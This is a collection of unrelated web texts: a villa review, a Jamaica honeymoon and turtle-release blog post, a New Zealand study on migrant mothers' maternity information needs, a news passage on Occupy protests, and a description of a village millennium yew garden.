bathroom. Double sinks faced a large mirrored wall. White curtained windows ran two thirds of the length of the bathroom. Toward the back of the bathroom there was a toilet, bathtub and shower.        <p><strong>Rooms</strong> Our 600-square foot air conditioned master suite was on the upper floor at the top of the spiral staircase. It had an en-suite bathroom, walk-in closet with safe and small open terrace facing the front garden and Bon Accord Estate Road beyond the property wall. A window facing queen bed with a brick red flower patterned bedspread occupied the center of the room. A remote controlled air conditioning wall unit kept the suite fresh allowing us a cool night&#x2019;s rest. There were glass and metal night tables and lamps on either side of the bed. A wood dresser and rectangular mirror sat in a corner. Double curtains hung over the terrace doors, one curtain was white and the other navy blue. A chandelier style lamp hung in the center. A glass brick wall divided the walk-in closet and the room; a smaller glass brick wall stood between the shower in the bathroom and the room.</p>       </div>       <div>        <strong>Amenities</strong> There were plenty of linens (some sheets were a bit aged), including pool towels, crockery, cutlery, glassware, safety box.        <p><strong>Pool</strong> The pool was set on a terraced area to the side of the house opposite the porte coch&#xe8;re. It housed several lounge chairs and two umbrellas to provide shade from the sun. There was a covered dining area to one side near the pool. There was also a 100 square meter gazebo ideal for receptions on the edge of property. It had a wet bar and hot plate, dining and sitting areas.</p>        <p>The pool itself sloped at steep angles from the edges toward the middle. It was 4 x 8 meters in size and approximately 1.85 meters deep. The owner explained that the architect felt that such a design matched the unique house plan. At the same time, the owners feel the slopes accommodate none swimmers and kids. There was an outdoor shower allowing guests to rinse off before entering the very clean pool.</p>       </div>       <div>        <strong>Other</strong> The owner&#x2019;s motto for Villa de Lena was &#x201c;Come as a stranger and leave as a friend.&#x201d; The Villa was well lit at night with interior and exterior lights throughout. Locking the wrought iron gates around the house required multiple keys. This meant we had to plan extra time when we went out to lock all the doors and gates with the single set of keys we received from the housekeeper.        <p>To reach Villa de Lena we had to drive down a gravel road being extra careful with our rental car because there were many potholes on the road making it a bumpy drive. Some taxis and one of the tour guides wouldn&#x2019;t drive down the gravel road.</p>        <p>Although there were phones throughout the house, phone access was for incoming calls only. The night before our departure, while we were discussing last minute flight changes our airline had made to our flights, our prepaid local mobile phone ran out of time. Although we had charged the phone to last us until our departure, the flight change required much more time than we would have expected. It was impossible to call the airline (or the car rental company) back from the house so we had to rush into town in the rain to find a mobile phone recharge before the airline offices closed for the day. Next time we will purchase extra mobile phone time.</p>        <p>The Villa website was convenient allowing us to glimpse available dates months in advance.</p>        <p>Villa de Lena was surrounded by bougainvilleas, exhoras, frangipani, croton, ginger lilies, oleanders, buttercups, queen of flower, periwinkle, bell flower, palms and silver tree.

   <div>   <p>When Matt and I got married, we chose to set up a honeymoon fund rather than a traditional gift registry. The fund was divided into excursions that we wanted to take on our trip around the world. One of those was a dream stay at Goldeneye Resort in Oracabessa, Jamaica. The resort is on the grounds of Ian Fleming&#x2019;s house on Oracabessa Bay. Chris Blackwell, founder of Island Records (Bob Marley, U2, etc) purchased the property and turned it into a beautiful resort. We decided to book a visit to Jamaica in time to celebrate Matt&#x2019;s birthday.&#xa0;Being fans of James Bond, we were excited to see what GoldenEye had to offer. &#xa0;After a stay in Florida to visit family and downsize a bit, we flew to Jamaica.</p>   <p>GoldenEye is the kind of place that you have to know where it is, otherwise you would never find it. They do not have any advertisement&#xa0;outside at their&#xa0;address, just a wrought iron gate in the trees with a little white sign on it that says &#x201c;Private&#x201d;. We had to call them to get directions for our driver.</p>   <p>When we arrived on the lush, tree-filled property, we were met by their concierge, Clayton, as well as several of the guests who we found out were regulars. Staff grabbed our bags while Clayton walked us to our cottage on the lagoon. As we descended down the steps, we passed the restaurant and the water sports area where they offered free kayaks, paddle boards, snorkel gear, and glass-bottomed boat rides. We crossed a bridge over the entrance of the lagoon and made our way down the path between two and three story houses that faced the sea.</p>   <p>Behind these houses was the lagoon and our cottage, number 8. We had our own dock with two kayaks, a patio with lots of seating, chaise lounges, and a table. Inside, was a large bed with mosquito netting, a bar, a full basket of tropical fruit, and a beautiful large bathtub. I thought that I was in heaven. Then Clayton opened the back door of the cottage that opened right up on to the lagoon so we could jump from our room right into the warm Jamaican water. That is when we knew that we were in heaven and that heaven comes with a free bottle of Blackwell Rum.</p>   <p>Now don&#x2019;t think that we spent our four days at GoldenEye doing nothing but lazing around in the water and drinking lots of rum. On our second day, we received a phone call from the front desk at the hotel asking if we would be interested in going to a &#x201c;turtle release&#x201d; that evening. We said &#x201c;yes&#x201d; right away. The hotel arranged transport and a small group of us rode out to St. Mary&#x2019;s, just further down on Oracabessa Bay. The driver dropped us at the ruins of an old resort and walked us through the crumbling structure to a beautiful beach where we met Mel Tennant.</p>   <p>Mel arrived in Jamaica in 2003. He says that he knew nothing of turtles. A couple of years later he began to see the turtles in front of his property in St. Mary&#x2019;s&#xa0;and became interested in helping them. He teamed up with the to create a monitoring system and continues to assist in releasing the baby turtles. He is on track to have helped release 25,000 turtles by the end of 2015. Mel also works with local groups to provide education to the citizens of Jamaica on how to protect the turtles and to keep the people from eating them. Mel explained that while turtle meat is considered a delicacy, it is extremely dangerous to eat because the turtles eat the poisonous sea sponges on the floor of the sea. Those toxins do not cook out and can kill infants and the elderly.</p>   <p>Helping the babies get from the nest to the sea requires constant monitoring of the nests and birthing times. Sea turtles typically birth during a full moon. Mel and his team of volunteers watch for turtle tracks, check for nests, and then begin the countdown to when the babies will hatch.</p>   <p>Our job was to help Mel by taking the baby turtles to the sea to rinse off the sand and egg residue. Then we carried them back up to a bucket near their nest where they were counted. When the turtles had been counted twice, Mel carefully tipped the bucket to allow the turtles to make their way quickly to the water.</p>   <p>Our job was to watch them and keep wildlife away &#x2013; seagulls, cats, dogs, etc. Releasing the babies up near their nest so they had to make their own way to the water, allowed for the female turtles to set their internal navigation to that beach spot so they can return in a few years to lay their own eggs. If they don&#x2019;t get this time, then they may never procreate because females always return to their place of hatching to lay their eggs.</p>   <p>That day we assisted with the release of 244 baby turtles. The babies were adorable and while we could only hold them for a few second, we all gave them words of advice &#x2013; swim fast and stay safe.</p>   <p>We only had four days at GoldenEye, but we have a feeling that we will be back. It is a beautiful place. It is not traditionally luxurious, instead, it feels like going home except to&#xa0;a home where you have warm and friendly staff, a chef, good bartenders, and a great soundtrack of wild birds, waves from the sea, and global tunes on drifting in from the beach bar, Bizot.</p>   <p>-Neeley (travelling 28-31&#xa0;August, 2015)</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

Auckland, New Zealand: University of Auckland.</p>   <p><strong>Abstract</strong> A central tenet of New Zealand&#x2019;s midwifery and maternity services is the emphasis on a partnership between two equals namely the midwife and the woman. However, such a partnership rests on the notion of an informed consumer who is independent. When the consumer is a migrant who has experienced social upheaval, lost their knowledge resources and is experiencing isolation and language barriers, they may take up a more dependent role rather than the autonomous and self-determining consumer that midwives are prepared for. This imbalance can mean that health professionals are challenged to take up less facilitative and more authoritative positions and in turn migrant mothers and their partners are challenged to develop more proactive roles. This paper presents partial and preliminary findings from a qualitative study of Asian mothers in New Zealand with regard to their information needs.</p>   <p><strong>Introduction</strong> The notion of a partnership between the midwife and the woman underpins New Zealand midwifery models, where both parties are equal and make equally valuable contributions (Pairman, 2001). Midwives bring their knowledge, skills and experience and the woman brings her knowledge of herself and her family and her needs and wishes for her pregnancy and birth. However, for women become equal partners, they need to make informed decisions about their health and this in turn depends on having access to relevant and timely information. For mothers, biological knowledge about the pregnancy, birth and labour is only one form of knowledge. In addition, social knowledge and institutional knowledge are important (Lazarus, 1994). While biological knowledge can be obtained from authoritative sources like experts and electronic resources, social and institutional knowledge are more difficult to access for migrant women. AS access to these forms of knowledge is dependent on context and social networks which migrant mothers often lose in the social upheaval of migration. For many women who migrate, the separation from family and peers leads to &#x2018;breaks in knowledge&#x2019; (Fitzgerald et al., 1998) and the loss of these knowledge resources which help prepare the mother for the processes of pregnancy, childbirth and parenting, creates what Liem (1999, p.157) calls a &#x201c;vacuum of knowledge&#x201d;. The vacuum of knowledge needs to be filled and most often this role falls heavily on health professionals (DeSouza, 2005).</p>   <p>This paper begins with a description of the dramatic population changes in New Zealand with a particular focus on Asian women. A discussion about receiving accurate and timely information follows suggesting that the quality of communication between women and their carers is critical for feeling safe and satisfied with care. An outline of research conducted in Auckland New Zealand follows and the findings are presented through the transition to parenthood. Strategies for managing the transition to parenthood and becoming an informed consumer are discussed with the paper concluding with practice, policy and research recommendations.</p>   <p><strong>Literature Review</strong> The following section contextualises the study by reviewing the changing demographics in New Zealand society with a focus on Asian women. This is followed by a discussion about the link between information and communication and satisfaction with care for migrants.</p>   <p><strong>An increasingly diverse New Zealand</strong> Service providers need to develop skills and competence for working effectively with diverse members of New Zealand society. International trends show that people of diverse racial, ethno-cultural and language backgrounds are underserved by health and social services, experience unequal burdens of disease, experience cultural and language barriers to accessing appropriate health care, and receive a lower quality of care when they do access health care services in comparison with members of the population (Johnstone &amp; Kanitsaki, 2005). The 2001 Census revealed growing numbers of M&#x2423;ori (14.5%), Pacific Island people (5.6%), Chinese (2.2%) and Indian (1.2%), in addition to European/Pakeha who make up 79.6% of the population. There has been a 20% increase in the number of multilingual people and an increase in people whose religion was non-Christian. People who practice Hinduism increased by 56%, there was a 48% increase in Buddhists and a 74% of people practising Islam.</p>   <p>Asians are the fastest growing ethnic group; increasing by around 140% over the last ten years and predicted to increase by 122% by 2021 due to net migration gains rather than high fertility rates (Statistics New Zealand, 2005). The Asian community has the highest proportion of women (54%), (Scragg &amp; Maitra, 2005) who are most highly concentrated in the working age group of 15-64 years compared to other ethnic groups, a reflection of a skills focused migration policy. 23% of New Zealand women were born overseas, predominantly in the UK and Ireland, Asia and the Pacific Islands. Some of the most dramatic demographic changes are evident in the Asian community, for example in the period between 1991 and 2001, the number of women originating from the Republic of Korea increased 23 times from 408 to 9,354, numbers of women from China quadrupled from 4,620 to 20,457 and women from South Asia doubled in the same time period (Statistics New Zealand, 2005). Such diversity has been unprecedented and present both unique challenges and opportunities to health and social service providers and policy makers.</p>   <p><strong>Communication, caring and safety</strong> Migration often results in the loss of reference points in the form of family networks, peer support and familiarity with health services. Such a loss amplifies the necessity for receiving accurate and timely information. Davies and Bath (2001) suggest that information provision during pregnancy and childbirth is critical for both supporting choices that are made but also in preparing women to manage uncertain outcomes. Citing a study by Kirkham (1989), Davies and Bath argue that women&#x2019;s satisfaction with maternity services in secondary care is primarily dependent on the quality of communication between the women and their carers. Little is known about the health care experiences of migrant women, however, they are thought to report more acute concerns about communication and sensitivity of care than the population in general (Davies &amp; Bath, 2001). Furthermore, language barriers can exacerbate isolation and promote dependency on health workers rather than enhancing self- determination, a dominant midwifery discourse. Small, Rice, Yelland, &amp; Lumley (1999) found that Vietnamese, Turkish and Filipino women in Melbourne who were not fluent English speakers experienced problems in communicating with their caregivers and this made experiences of care less positive. Of more importance than knowledge about cultural practices, was care experienced as unkind, rushed, and unsupportive. Another Australian study found that migrant patients (and their families) did not feel safe when in hospital. Safety was undermined when effective communication with caregivers was compromised through being unable to access qualified health interpreters or being unable to have family members around to advocate and participate in decision-making (Johnstone &amp; Kanitsaki, 2005).</p>   <p><strong>The study</strong> Migrants tend to maintain better health than the local population initially so often have little to do with hospitals (McDonald &amp; Kennedy, 2004), but motherhood is a common aspect of migration requiring contact with the health system. The study took place in Auckland, New Zealand among White migrants (from South Africa, United Kingdom and the United States of America), Muslim Arab migrants (from Iraq and Palestine) and Asian women from three ethnic communities (Korean, Chinese and Indian) as part of a larger Families Commission funded study. Ethics approval was obtained from the Auckland University of Technology Ethics Committee and the Plunket Ethics Committee. Participants for the migrant mothers&#x2019; focus group were recruited though Plunket nurses who invited women to participate, selection criteria limited participation to migrant women who had become mothers within the last 12 months in New Zealand. Informed consent was obtained from all participants and consent forms were translated into Arabic, Korean and Chinese. Data collection involved focus groups using semi-structured interviews conducted in English, Chinese and Korean. The groups were facilitated by interviewers proficient in English and the language spoken by the women. These interviews were recorded and transcribed, translated into English if necessary and verified by an independent translator. The interview transcripts were then coded and analysed. The codes were clustered according to similarity and reduced. Similar phenomena were grouped into categories and named. The process was one of constant comparison, iteratively classifying and grouping the material to identify preliminary categories and sub- categories. This paper reports on a sub-theme about information needs and the findings focus on Asian women.</p>   <p><strong>Findings </strong> Midwives caring for migrant Asian parents are challenged to reconfigure their model of partnership and in turn migrant Asian parents experience a shift from birth being a social event to more of an individual responsibility. This shift requires a more proactive and self- sufficient role for women and their husbands, who become more involved than they might have been in their country of origin. In addition, language and communication drive experiences of care. This separation from knowledge resources places greater responsibility onto midwives to assume a more central role in information provision and support. In particular migrant mothers require detailed, individualised, stage specific information in order to take up the role of informed consumer.</p>   <p><strong>Antenatal period</strong> Not only are migrant mothers confronted with changing bodies and roles when they become pregnant, they also have to deal with an unfamiliar health system in the absence of a support network and knowledge resources they might have had in their countries of origin. In this study, Asian migrant women had to make decisions that required access to information in order to ascertain the choice of maternity carer and access to ante-natal classes. At this time women who were not fluent or confident English speakers had to contend with linguistic and cultural barriers to accessing services.</p>   <p>The loss of traditional sources of knowledge meant that pregnancy in a new country moved from being a social event and responsibility to being an individual one (DeSouza, 2005). This required the participants to become more involved and proactive in seeking out detailed, timely and specific information about the stages of their pregnancy. This allowed them to become more involved in the pregnancy than if they had been in their country of origin where this responsibility would have been shared. Husbands also became more involved in the processes of pregnancy, than they might have been in their countries of origin. Knowing where to begin the process was difficult:</p>   <p><em>I had no idea at all about the system here. It was through the pregnancy test kit that I found out I was pregnant, but did not know what the next step was. I wondered whether I had to show my test result to my GP. I had no knowledge of how to get the necessary information [Korean participant].</em></p>   <p>Obtaining language specific and precise information was important for many Korean women. Being given broad encouragement was not a substitute for specific information and was perceived as a laissez-fare attitude to their wellbeing.</p>   <p><em>I was given some information, but I didn&#x2019;t read it, as it was not in Korean. I always felt that I was one step behind. It was not only the midwife who did not give enough information or necessary support. Everyone kept saying, &#x201c;It is okay, you are doing well&#x201d; but gave few information or specific support [Korean participant].</em></p>   <p>Pregnancy in a new country raised the need to develop active decision making strategies and to choose a health care provider. Many of the women were proactive about finding out about the New Zealand health system and turned to authoritative sources for information:</p>   <p><em>Luckily, I was attending school and the assignment from school was to complete a project. I chose &#x2018;New Zealand&#x2019;s maternity system&#x2019; and that was how I got some ideas about my situation [Korean participant].</em></p>   <p>For some women the absence of family members and the access to information meant that they could monitor themselves through the stages of pregnancy and this led to developing increased knowledge and greater self-sufficiency:</p>   <p><em>I have to take care of my own self. I found this good thing in New Zealand that you should take care of the baby and you should be aware of foods and what is going on each and every month, each and every week, what really is important [Indian participant].</em></p>   <p>One Indian woman found that she was more engaged in her pregnancy because her previous pregnancy was a joint responsibility with other family members while this time round she had to take more personal responsibility:</p>   <p><em>Why didn&#x2019;t I get the feelings the first time? Time passed with families, mother in law, sisters, brothers and time passed like anything but here we are alone,&#xa0; thinking about the baby early and so every moment for me was a first time moment, even though I&#x2019;m a second time mother [Indian participant].</em></p>   <p>Many husbands become more involved during the pregnancy and were more in tune with what was happening to their partner&#x2019;s bodies:</p>   <p><em>We used to wake up and the first thing we used to do was take a book and read &#x2018;Okay, so now our baby&#x2019;s doing that&#x2019; and he will pat me on my tummy saying &#x2018;Oh my little one&#x2019; you know? So I doubt whether the same feeling would have come if my pregnancy was in India [Indian participant].</em></p>   <p>Language dictated the choice of LMC for many Chinese women and they, more than any other cohort, relied on their networks to find a care provider with Chinese newspapers also being a useful knowledge resource.</p>   <p><em>She speaks English and can speak Chinese. After I met her, I had a good impression of her. So I decided to have her as my midwife. My midwife has a partner who is also a Chinese (Malaysian Chinese). When I gave birth to my child, her partner delivered my child. The whole process was quite smooth [Chinese participant].</em></p>   <p><strong>Antenatal classes</strong> Antenatal classes were a pivotal mechanism for acquiring knowledge:</p>   <p><em>When you know something it&#x2019;s better than just going without knowledge and you&#x2019;re worried. , Yeah and as a first time mother I didn&#x2019;t really know what was going to happen or what to expect and then yeah, I learnt a lot from that [Indian participant].</em></p>   <p>And for gaining confidence about what was to come by having some broad knowledge about what was to come<em>:</em></p>   <p><em>I felt it was not so relevant to my delivery. But I felt more at ease and more confident during delivery. There are Chinese people in the class. The midwife was also careful when teaching us. We could understand her. My husband&#x2019;s English is very good. He escorted me to the class. It was about some basic ideas. I didn&#x2019;t find it useful for my delivery. During delivery, you follow the instructions of your midwife and have no time to reflect on what was taught in the class. But you feel relieved and less anxious. You roughly know what is going to happen and what is what [Chinese participant].</em></p>   <p>But language barriers made classes inaccessible for some:</p>   <p><em>I felt frustrated because I could not understand everything [Korean participant].</em></p>   <p><em>Both my husband and I have poor English so only attended once [Korean participant].</em></p>   <p>This section highlighted the importance of receiving detailed and specific information in one&#x2019;s own language and how this influences the choice of LMC or attendance at ante-natal classes. Knowing where to start can be difficult. For women and their husbands who want to take up an informed consumer role there are resources available which lead women and their husbands to be more self-sufficient, proactive and engaged in the process<strong>.</strong></p>   <p><strong>Labour and delivery</strong> Labour and delivery was also a time when information, support and cultural needs were highlighted. Women wanted information that was specific to their stage of labour and that was individualised (some felt they had too much and others too little information to feel that they could make the best choice for themselves). The value of specific stage by stage information was supported by a Korean participant rather than broad encouragement:</p>   <p><em>In Korea mums are given lots of warning and feedback of what is happening during labour, and told by Dr&#x2019;s what to do regularly. This was missing in NZ. It would be good to be given feedback of our progress of labour and how many cm we are at each stage after the vaginal examinations. I was not told this. Not enough explanation and only told that &#x201c;You are doing well&#x201d; [Korean participant].</em></p>   <p>The need for not only specific information but also to be told the best option or given enough information to make the best choice was also voiced. The facilitative role of health providers was called into question with some participants wanting a more authoritative role. The partnership between the midwife and the woman underpins the midwifery model in New Zealand maternity services and is based on equity and the acknowledgement that both parties make equally valuable contributions (Pairman, 2001). Midwives bring their knowledge, skills and experience and the woman brings her knowledge of herself and her family and her needs and wishes for her pregnancy and birth. Midwives have moved from authoritative sources of knowledge to models of partnership and collaboration in a bid to empower women and distinguish themselves from the more hierarchical professional models of medical, nursing and obstetric practise (Tully, Daellenbach, &amp; Guilliland, 1998). However, this is predicated on the notion of the informed consumer:</p>   <p><em>In NZ different delivery options are given to mums and we are asked to choose by ourselves but unable to choose the best options for ourselves due to lack of sufficient knowledge. Want more advice and guidance and even want to be told which better option for us is. So in the end we have limited options due to not enough knowledge of all the pros and cons of delivery methods [Korean participant].</em></p>   <p>Information does need to be individualised, one participant who felt that she was given too much information:</p>   <p><em>During the labour the ladies said that I need an epidural because I can&#x2019;t go through the pain anymore, the anaesthetist comes in the room and says out of 150 million there are 10% of cases with risk all that information beforehand [Indian Participant].</em></p>   <p>This section has highlighted the importance of detailed and specific information and the need for information to be individualised. The midwifery model of care which emphasises facilitative rather than authoritative relationships was challenged.</p>   <p><strong>Post-partum</strong> The postnatal period is a critical time for women but it is also a time when their needs are often not met (Baker, Choi, Henshaw, &amp; Tree, 2005). In the postpartum, information needs were an issue, women needed to know how to handle an unpredictable and unknown baby, there were issues around feeding from a cultural point of view and what to feed and when, the amount and type of information became important too:</p>   <p><em>We need more information. Iron deficiency for example. We don&#x2019;t know what to feed our babies for this. And solid feeding too. We don&#x2019;t know how to begin solid feeding with Korean food. The information is only on Kiwi way of feeding [Korean participant].</em> <em>I didn&#x2019;t even know how to care for her after delivering baby. No knowledge. Had to cook and clean and do everything after delivering baby , had no one to help. Breastfeeding was hard, received no help. Got sore bones and joints. No Korean appropriate services available, so often missed out altogether on information and the right kind of help [Korean participant].</em></p>   <p>However, not everyone wanted to be an informed consumer:</p>   <p><em>Yeah, you just want to get out of that place and these people are giving you like the advantages and disadvantages of various things, you don&#x2019;t want to hear all these things [Indian participant].</em></p>   <p>The post-partum period highlights the need for the expansion of the information agenda from New Zealand models of infant feeding to incorporating other cultural models and the need for language specific information about breastfeeding. Some women contested the pressure to be informed consumers. The following section provides some discussion and recommendations.</p>   <p><strong>Discussion</strong></p>   <p>This section focuses on five key areas where further exploration and consideration by both migrant mothers and health professionals would be beneficial, namely:</p>   <ul>    <li>Providing detailed and individualised information;</li>    <li>Language support;</li>    <li>Preparing women for new discourses of maternity;</li>    <li>Developing fluency; and Developing health literacy.</li>   </ul>   <p><strong>Providing detailed and individualised information</strong></p>   <p>Health-care providers have a responsibility to make available, accessible and up-to-date information. However this is not as easy as it sounds, when facilitating informed choice. Midwives and other health professionals are caught in a difficult position and have to strike other balances, such as between giving enough information for the woman to make a choice but not giving too much information and frightening her (Levy, 2006). They also have to delicately meet the needs of women and to appear neutral in their advice, when they might have strong feelings regarding certain issues. In this study, migrant mothers looked to health professionals to fill the vacuum of knowledge by being authoritative rather than facilitative. Increasingly research shows that information is more effective when it is tailored to the individual and their needs (Rapport et al., 2006) and relevant to the women&#x2019;s current stage of pregnancy (Benn, Budge, &amp; White, 1999). In addition detailed information rather than &#x2018;big picture&#x2019; was valued. Therefore highlighting the need for individualised and detailed information when planning for the provision of maternity information (Soltani &amp; Dickinson, 2005). Information that is available in ones own language or written information is important. While translated information is available about childbirth in New Zealand from the Maternity Services Consumer Council of New Zealand it is not clear how well this information is distributed or whether LMCs are aware of its existence.</p>   <p><strong>Language support</strong> Communication as a part of information support can be improved through implementing a two pronged strategy. First, health professionals and systems can become more skilful at information provision through linguistic competence and secondly through identifying and assisting in the extension of sources of information. Health providers can assist new migrants to identify information sources and encourage women to develop information seeking skills. Developing linguistic and cultural competence can be achieved by:</p>   <ul>    <li>Providing bilingual /bicultural staff;</li>    <li>Providing foreign language interpreting services; Having link workers/advocates; and&#xa0;&#xa0;&#xa0;&#xa0; Having materials developed and tested for specific cultural, ethnic, and linguistic groups;</li>    <li>Having translation services including those of:Legally binding documents (for example, consent forms); Hospital signage; Health education materials; and Public awareness materials and campaigns, including ethnic media in languages other than English. Examples include television, radio, internet, newspapers and periodicals (Szczepura, 2005).</li>   </ul>   <p>In the USA, health care organisations are required to both offer and provide language services such as bilingual staff and interpreter servicesat no extra cost to clients who require it. It is recommended that information about services is provided both in writing and in a timely manner with credentialed interpreters and bilingual workers available (U.S. Dept. of Health and Human Services, 2003).</p>   <p>Lastly, research is needed to assess the level of unmet information needs among new migrant women in greater depth. To borrow from a recommendation from a recent study: Research is needed on cross-cultural and intercultural communication in particular on the nature and impact on Culturally and Linguistically Diverse (CALD) people not being able to communicate with service providers; not being able to get information and explanations about &#x2018;what is going on&#x2019;; not being able to get information in a timely manner; not being given information in a culturally appropriate manner; not being given any information at all; being given too much information; being given unwanted information (Johnstone &amp; Kanitsaki, 2005, p.15).</p>   <p><strong>Preparing women for new discourses of maternity</strong> The study findings highlight the need for health providers to assist women socialise into new discourses in particular the discourse of partnership and the informed consumer. A useful mechanism for socialising women into an informed consumer discourse is to provide multi- lingual antenatal classes. Many women in this study felt the need for specific and detailed information in order to make the best choice but some women also wanted to be told the best option. The facilitative role of health providers was called into question with some participants wanting their LMC to have a more authoritative style. The partnership model underpinning midwifery in New Zealand maternity services assumes that midwives bring their knowledge, skills and experience and women brings their knowledge of themselves and their families to the relationship. This is intended to be a collaborative and empowering relationship but it requires that the woman wants the responsibility of being an informed consumer. It appears that the notion of partnership cannot contain women who don&#x2019;t want the equal responsibility that is required. In addition, one needs to be information literate in order to take this role on (Henwood, Wyatt, Hart, &amp; Smith, 2003).</p>   <p><strong>Developing fluency</strong> Lack of English language proficiency impacts on access to health care, employment prospects, income levels and other factors which determine health status (Asian Public Health Project Team, 2003).The link between language and accessing health care is further strengthened by the findings of a New Zealand study where self-rated fair or poor health was found to be associated with Chinese-only reading knowledge, residency of more than five years and regretting having come to New Zealand (Abbott, Wong, Williams, Au, &amp; Young, 2000). While a study of Chinese American women which found that lack of English language ability was a major barrier to access (Liang, Yuan, Mandelblatt, &amp; Pasick, 2004). Ensuring that migrants are aware of Language line and encouraging them to take up their English for Migrants language courses, as proficiency is a key settlement enhancer. The migrant levy that migrants pay when coming to New Zealand entitles migrants to take up English language classes (English for Migrants). The Tertiary Education Commission pays for English language tuition on behalf of migrants to New Zealand who have pre-paid for their training, recent news reports indicate that few migrants take up these classes.</p>   <p><strong>Developing health literacy</strong> The development of health literacy among health care recipients is gaining prominence as a health promotion strategy. Health literacy is defined by the World Health Organisation as &#x201c; the cognitive and social skills which determine the motivation and ability of individuals to gain access to, understand, and use information in ways that promote and maintain good health&#x201d; (World Health Organization, 1998, p.10). Health literacy is a stronger predictor of health status than socio-economic status, age, or ethnic background (Speros, 2005). Speros claims that the lack of health literacy can act as a barrier to navigating the system and functioning successfully as a consumer, presumably then the combination of socio-economic status, ethnic background and low health literacy compound the issues of access. Speros cites a large study by Williams et al. (1995) which found that one-third of English -speaking patients at two public hospitals in the USA could not read and understand basic health-related materials. Sixty per cent could not understand a routine consent form, 26% could not understand information written on an appointment slip, and 42% failed to comprehend directions for taking medications. While little is known about health literacy is known in New Zealand, overseas research suggests that being culturally and linguistically different magnifies the problem.</p>   <p><strong>Conclusion </strong> This study highlights the importance of information provision for health care consumers, in particular migrant mothers. The study shows that migrant women frequently experience a vacuum of knowledge that needs to be filled. Factors such as poor English language proficiency, limited networks and unresponsive health providers can all increase the likelihood of migrant mothers experiencing a problematic birth experience and poor outcomes. This research suggests that improving the quality and range of information for migrant mothers and the inter-cultural resources for health providers could improve outcomes.</p>   <p>Further research is needed into how maternity information is provided and it is suggested that more attention is paid to the information needs of migrant mothers and migrants in general. Language proficiency is vital not only with regard to access to services but also for being empowered and prepared for the dual transition of parenthood in a new country. The study highlights the need for further exploration of changing demographics on dominant health care discourses in New Zealand such as partnership and whether there is space for new discourses. There are several aspects that contribute to a satisfying experience of health care for migrant mothers and these appear to be the ability to access a service, being able to obtain relevant information and having a supportive relationship between themselves and providers. These appear to be mutually dependent factors.</p>   <p><strong>Acknowledgements </strong></p>   <p>Funding for this research was provided by grants from The Families Commission and the Plunket Society volunteers in Central Auckland.

Solidarity is the people&#x2019;s weapon,&#x2019; the Real Democracy group said in a statement calling on people to join the protest.</p>    <p>In Paris protests were expected to coincide with the G20 finance chiefs&#x2019; meeting there. In Madrid, seven marches were planned to unite in Cibeles square at 1600 GMT and then march to the central Puerta de Sol.</p>    <p>In Germany, where sympathy for southern Europe&#x2019;s debt troubles is patchy, the financial centre of Frankfurt and the European Central Bank in particular are expected to be a focus of marches called by the Real Democracy Now movement.</p>    <p>In South Korea, activists began gathering on the streets of Seoul with the country&#x2019;s paper, the Korea Herald reporting that a coalition of 30 local civic groups planned to hold a two-day protest in the main financial district of Yeouido and other parts of the capital.</p>    <p>The protesters, who have adopted slogans and imagery used by those in the U.S., say the rally is designed to motivate &#x2019;99 percent of Koreans&#x2019; to complain about the actions of the wealthiest &#x2018;one per cent&#x2019;, the paper said.</p>    <p>&#x2018;The situation is the same in South Korea (as the U.S.), where the financial institutions have speculated to earn high profits in a short time, creating victims,&#x2019; the coalition said in a statement, the Herald reported. </p>    <p>Seoul police warned that damaging public facilities, occupying roads and assaulting police officers would not be tolerated, the Herald said. </p>    <p>&#x2018;We will arrest those who stage illegal protests on the spot and also seek legal action even after the rally ends,&#x2019; the Seoul Metropolitan Agency said in a release, the paper reported. </p>    <p>In Canada, protests were planned for Saturday in cities including Montreal and Vancouver. In Toronto, demonstrators plan to gather at Canada&#x2019;s main stock exchange. </p>    <p>In New York&#x2019;s Wall Street, police have been accused of shocking brutality after videos emerged showing officers in punching Occupy Wall Street protesters and mowing them down on motorbikes.</p>    <p>As demonstrations turned bitterly violent, hundreds of protesters clashed with police as they marched in Manhattan &#x2013; jumping over barriers, pushing over police scooters and blocking traffic.</p>    <p>Officers in turn seem to have responded in the most draconian manner. In one clip a policeman appears intentionally to run over a protester, trapping his leg under his motorbike&#x2019;s back wheel.</p>    <div>     <p>Related posts:</p>    </div>    </div>   <div>    <span> Category: </span>    <span> Tags: , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , </span>   </div>  </article>  
   <div>   <div>    <p>Hamsterley Millennium Yew Garden adjacent to the Methodist Chapel was created in 2000 in celebration of the new Millennium. The small walled garden has an attractive display of flowers and shrubs with beauty, scents and fruits in every season throughout the year. Centrepiece in the Garden is a Yew, grown from a cutting from a 2000 year old tree in the churchyard at Hambledon in Surrey. In 2003 the Garden received a County Durham Environment Award. The Garden is&#xa0; cared for by volunteers who share in working parties and&#xa0; individual visits in line with a rota.</p>    <p>Displays and events in the Garden reflect anniversaries and include a summer Garden Party, and village carol singing around the Christmas tree.</p>    <p>A leaflet giving information is available and a stone plinth in the Garden tells the story of the Garden. Access to the Garden is normally available during daylight hours.</p>    <h2><b>Friends of the Millennium Garden</b></h2>    <p>All with an interest are regarded as Friends.

David Bellamy, botanist, conservationist and TV personality, is a local resident and he suggested that we might be fortunate enough to be among the recipients of a Millennium Yew.</p>    <p>The Conservation Foundation Yew Tree Campaign had been launched by David in 1987 to help record and protect some of Britain&#x2019;s oldest trees, and its &#x2018;Yews for the Millennium&#x2019; project was devised to offer each parish in the country a yew sapling, grown from a cutting of an existing yew at least 2,000 years old &#x2013; in other words a tree already growing at the time of the birth of Christ.</p>    <p>The cuttings were duly taken from ancient yews (some as much as 4,000 years old) throughout England and Wales during 1996 and grown on for the purpose.&#xa0; It was assumed that a few hundred yew saplings would be requested but the idea became so popular that in the end some 8,000 of these new yew trees were planted.</p>    <p>We know, in fact, that our own &#x2018;Taxus baccata&#x2019;, which was a mere slip of green when we received it, came from the mighty Hambledon Yew in Surrey, a tree known to be at least 2000 years old.&#xa0; We now needed a prominent position for our very special tree.</p>    <p>At this point, we were kindly offered the use of the walled enclosure adjacent to the Methodist Church.&#xa0; It was immediately plain that this was, in fact, the perfect location for a small garden, being centrally placed in the village and therefore accessible to all.&#xa0; Its condition was, however, less ideal!&#xa0; It had long since become redundant, overgrown and very derelict, so the first task was to find volunteers to undertake the heavy work of site clearance.</p>    <p>A major factor in our decision to go ahead was a donation of &#xa3;2500 from the County Durham Environmental Trust (CDENT) under the Government&#x2019;s Landfill Tax Credit Scheme.&#xa0; It was the positive decision on this grant that gave us the confidence to proceed with the commissioning of features that might otherwise have been 